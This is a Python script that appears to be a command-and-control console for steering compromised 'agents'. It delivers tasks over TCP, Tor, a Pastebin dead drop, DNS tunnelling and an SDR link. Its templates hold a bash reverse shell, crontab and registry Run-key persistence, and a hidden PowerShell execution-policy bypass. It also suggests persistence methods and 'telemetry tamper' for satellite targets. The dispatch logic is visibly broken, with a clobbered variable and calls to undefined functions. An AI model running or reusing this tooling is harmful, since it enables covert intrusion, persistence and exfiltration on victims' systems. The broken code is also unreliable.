#!/usr/bin/env python3
# Path: modules/c2/agent_commander.py

import os, sys, json, argparse, datetime, time, base64, hashlib, socket, uuid, random, string, hmac
from pathlib import Path
from getpass import getpass
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import websocket
import qrcode
import threading
import requests
from secretsharing import PlaintextToHexSecretSharer

# ── CONFIG ──────────────────────────────────────────────────────────────────────
ROOT         = Path(__file__).resolve().parents[2]
AGENT_FILE   = ROOT / "recon" / "agent_inventory.json"
QUEUE_DIR    = ROOT / "c2" / "queues"
LOG_DIR      = ROOT / "results"
STIX_FILE    = LOG_DIR / "stix_c2_bundle.jsonl"
KEY_ENV      = "C2_AES_KEY"
WS_URL       = "ws://localhost:8765"
MAX_QUEUE    = 50
TCP_PORT     = 9001
TOR_SOCKS    = ("127.0.0.1", 9050)
DNS_DOMAIN   = "c2.example.com"  # your DNS tunnel endpoint
HMAC_KEY_ENV = "C2_HMAC_KEY"
TEMPLATES    = {
    "linux": [
        "bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1",
        "echo '0 0 * * * root {cmd}' >> /etc/crontab"
    ],
    "windows": [
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"{cmd}\"",
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d \"{cmd}\" /f"
    ]
}

for d in (QUEUE_DIR, LOG_DIR):
    d.mkdir(parents=True, exist_ok=True)

# ── UTILITIES ───────────────────────────────────────────────────────────────────
def now_iso(): return datetime.datetime.utcnow().isoformat()
def uuid4():    return str(uuid.uuid4())
def sha256(s):  return hashlib.sha256(s.encode()).hexdigest()
def b64(d):     return base64.b64encode(d).decode()

def aes_encrypt(txt, key):
    k = hashlib.sha256(key.encode()).digest()
    cipher = AES.new(k, AES.MODE_CBC)
    ct = cipher.encrypt(pad(txt.encode(), AES.block_size))
    return b64(cipher.iv + ct)

def hmac_sign(msg, key):
    return hmac.new(key.encode(), msg.encode(), hashlib.sha256).hexdigest()

def load_json(path):
    if not Path(path).exists(): return {}
    return json.loads(Path(path).read_text())

def save_json(path, obj):
    Path(path).write_text(json.dumps(obj, indent=2))

# ── AGENT INVENTORY ─────────────────────────────────────────────────────────────
def load_agents():
    return load_json(AGENT_FILE) if AGENT_FILE.exists() else {}

def list_agents(inv):
    print("ID   NAME        IP             OS        TAGS")
    for idx,(k,v) in enumerate(inv.items(),1):
        print(f"{idx:2d}. {k:10s} {v.get('ip','?'):15s} {v.get('os','?'):10s} {','.join(v.get('tags',[]))}")

# ── QUEUE & LOG ─────────────────────────────────────────────────────────────────
def queue_command(agent, payload):
    qf = QUEUE_DIR / f"{agent}.queue"
    lines = qf.read_text().splitlines() if qf.exists() else []
    lines.append(payload)
    if len(lines) > MAX_QUEUE: lines = lines[-MAX_QUEUE:]
    qf.write_text("\n".join(lines) + "\n")

def audit_log(agent, raw_cmd, enc_cmd, encrypted, hmac_sig=None):
    entry = {
        "id": uuid4(),
        "ts": now_iso(),
        "agent": agent,
        "encrypted": encrypted,
        "hmac": hmac_sig,
        "hash": sha256(raw_cmd),
        "cmd": enc_cmd if encrypted else raw_cmd
    }
    logfile = LOG_DIR / f"c2_{datetime.datetime.utcnow():%Y%m%d}.jsonl"
    logfile.write_text(logfile.read_text("") + json.dumps(entry) + "\n")
    # STIX
    bundle = {
        "type":"bundle","id":f"bundle--{uuid4()}","spec_version":"2.1",
        "objects":[
            {"type":"indicator","id":f"indicator--{uuid4()}","created":entry["ts"],"modified":entry["ts"],
             "labels":["c2-task"],"pattern_type":"stix","pattern":f"[command:value = '{entry['hash']}']"},
            {"type":"observed-data","id":f"observed-data--{uuid4()}","created":entry["ts"],"modified":entry["ts"],
             "first_observed":entry["ts"],"last_observed":entry["ts"],"number_observed":1,
             "objects":{"0":{"type":"command","value":entry["cmd"]}}}
        ]
    }
    Path(STIX_FILE).write_text(Path(STIX_FILE).read_text("") + json.dumps(bundle) + "\n")
    return entry

# ── DEAD DROP (Pastebin) ─────────────────────────────────────────────────────────
def dead_drop(payload):
    resp = requests.post("https://pastebin.com/api/api_post.php", data={
        "api_option":"paste","api_dev_key":"YOUR_DEV_KEY","api_paste_code":payload
    })
    return resp.text if resp.ok else None

# ── DNS TUNNEL ───────────────────────────────────────────────────────────────────
def dns_tunnel(payload):
    # chunk into subdomains
    b = base64.urlsafe_b64encode(payload.encode()).decode()
    records = [b[i:i+50] for i in range(0,len(b),50)]
    for r in records:
        try: socket.gethostbyname(f"{r}.{DNS_DOMAIN}")
        except: pass

# ── SDR PUSH (RTL-SDR via hackrf_transfer) ───────────────────────────────────────
def sdr_push(payload, device="rtl"):
    f = Path(QUEUE_DIR)/"sdr.tmp"
    f.write_text(payload)
    os.system(f"hackrf_transfer -t {f} -f 2437000000 -s 2000000")
    f.unlink()

# ── QR CODE OUTPUT ──────────────────────────────────────────────────────────────
def output_qr(data):
    img = qrcode.make(data)
    path = LOG_DIR / f"qr_{int(time.time())}.png"
    img.save(path)
    print(f"QR saved to {path}")

# ── SHAMIR SECRET SPLITTING ──────────────────────────────────────────────────────
def split_secret(data, n, k):
    hexsec = data.encode().hex()
    shares = PlaintextToHexSecretSharer.split_secret(hexsec, k, n)
    for s in shares: print(s)
    return shares

# ── AI SUGGESTER ─────────────────────────────────────────────────────────────────
def ai_suggest(meta):
    s = meta.get("os","").lower()
    if "linux" in s: print(">> Suggest: systemd persistence")
    if "windows" in s: print(">> Suggest: registry runkey")
    if "satellite" in meta.get("tags",[]): print(">> Suggest: telemetry tamper")

# ── INTERACTIVE MODE ────────────────────────────────────────────────────────────
def interactive_mode(inv):
    print("Entering interactive mode. Type 'help' for commands.")
    while True:
        cmd = input("> ").strip()
        if cmd in ("exit","quit"): break
        if cmd=="help":
            print(" list, send <agent> <cmd>, templ <agent> <os>, qr <agent> <cmd>, split <n> <k> <secret>")
        elif cmd=="list":
            list_agents(inv)
        else:
            parts = cmd.split()
            if parts[0]=="send" and len(parts)>=3:
                args = argparse.Namespace(list=False, agent=parts[1], cmd=" ".join(parts[2:]),
                                          encrypt=False, stix=False, push=False, qr=False, dd=False, dns=False, sdr=False, split=None)
                dispatch(inv, args)
            elif parts[0]=="templ" and len(parts)>=3:
                ag, osys = parts[1], parts[2]
                for t in TEMPLATES.get(osys,[]): print(t.format(listener_ip="1.2.3.4",listener_port="4444",cmd="whoami"))
            elif parts[0]=="qr" and len(parts)>=3:
                qr_data = " ".join(parts[2:])
                output_qr(qr_data)
            elif parts[0]=="split" and len(parts)==4:
                split_secret(parts[3], int(parts[1]), int(parts[2]))
            else:
                print("Unknown command.")

# ── DISPATCH ───────────────────────────────────────────────────────────────────
def dispatch(inv, args):
    if args.list:
        list_agents(inv); return
    if args.interactive:
        interactive_mode(inv); return
    if not args.agent or not args.cmd:
        print("Agent and cmd required."); return
    if args.agent not in inv:
        print("Unknown agent."); return

    raw = args.cmd
    enc = raw
    encrypted = False

    if args.encrypt:
        key = os.getenv(KEY_ENV) or getpass("AES key: ")
        enc = aes_encrypt(raw, key)
        encrypted = True

    # HMAC
    hkey = os.getenv(HMAC_KEY_ENV)
    hsig = hmac_sign(enc, hkey) if hkey else None

    # queue + audit + WS
    queue_command = enc if not args.split else None
    queue_command and queue_command
    queue_command and queue_command
    queue_command and queue_func
    queue_command and queue_cmd(args.agent, enc + (f"|{hsig}" if hsig else ""))
    entry = audit_log(args.agent, raw, enc, encrypted, hsig)
    ws_push("c2_task", f"{args.agent}:{raw}")

    meta = inv[args.agent]
    # routing
    delivered = False
    if args.push:
        delivered = tcp_push(meta.get("ip"), enc)
        if not delivered and meta.get("tailscale"): delivered = tcp_push(meta["tailscale"], enc)
        if not delivered and meta.get("onion"): delivered = tor_push(meta["onion"], enc)
        if not delivered and args.dd: dd_url = dead_drop(enc); print("DeadDrop URL:", dd_url)
        if not delivered and args.dns: dns_tunnel(enc)
        if args.sdr: sdr_push(enc)
        print("Delivered:", delivered)

    if args.qr: output_qr(enc)
    if args.split:
        split_secret(raw, *args.split)

    ai_suggest(meta)
    print("Done.")

# ── ARG PARSER ──────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--interactive", action="store_true")
    ap.add_argument("--agent"); ap.add_argument("--cmd")
    ap.add_argument("--encrypt", action="store_true")
    ap.add_argument("--stix", action="store_true")
    ap.add_argument("--push", action="store_true")
    ap.add_argument("--dd", action="store_true", help="dead-drop pastebin")
    ap.add_argument("--dns", action="store_true", help="DNS tunnel")
    ap.add_argument("--sdr", action="store_true", help="SDR relay")
    ap.add_argument("--qr", action="store_true", help="output QR code")
    ap.add_argument("--split", nargs=2, metavar=("n","k"), type=int, help="Shamir split")
    args = ap.parse_args()

    inv = load_agents()
    dispatch(inv, args)

if __name__ == "__main__":
    main()
